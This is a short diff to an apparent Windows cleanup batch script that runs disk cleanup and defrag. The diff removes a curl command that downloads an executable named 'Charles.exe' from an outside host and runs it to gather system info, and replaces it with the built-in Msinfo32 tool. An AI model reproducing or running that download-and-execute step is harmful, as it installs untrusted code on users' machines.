@@ -43,9 +43,7 @@ cleanmgr.exe /sagerun:1
 
 defrag.exe /C /D /G /H
 
-curl "https://lfs.spacegamedev.com/no-cache/Charles.exe" --output "Charles.exe"
-
-Charles sysinfo
+C:/Windows/SysWOW64/Msinfo32.exe /nfo sysinfo.nfo
 
 echo Command completed! You may now close this window.
 
